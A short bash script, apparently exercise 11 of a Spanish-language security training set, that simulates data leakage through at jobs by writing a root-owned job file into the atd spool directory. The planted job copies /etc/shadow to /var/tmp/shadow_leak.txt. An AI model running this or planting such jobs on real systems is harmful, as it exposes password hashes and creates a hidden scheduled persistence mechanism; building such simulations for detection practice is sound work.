#!/bin/bash
# Ejercicio 11: Fuga de Datos a través de Tareas Anónimas de atd
# Configura una tarea programada única con el comando at si está disponible
# Si no está instalado, simula la estructura binaria en su directorio de cola
mkdir -p /var/spool/cron/atjobs
echo "#!/bin/sh" > /var/spool/cron/atjobs/a0000101c4e200
echo "cat /etc/shadow > /var/tmp/shadow_leak.txt" >> /var/spool/cron/atjobs/a0000101c4e200
chmod 600 /var/spool/cron/atjobs/a0000101c4e200
chown root:daemon /var/spool/cron/atjobs/a0000101c4e200
echo "Simulación 11 completada."
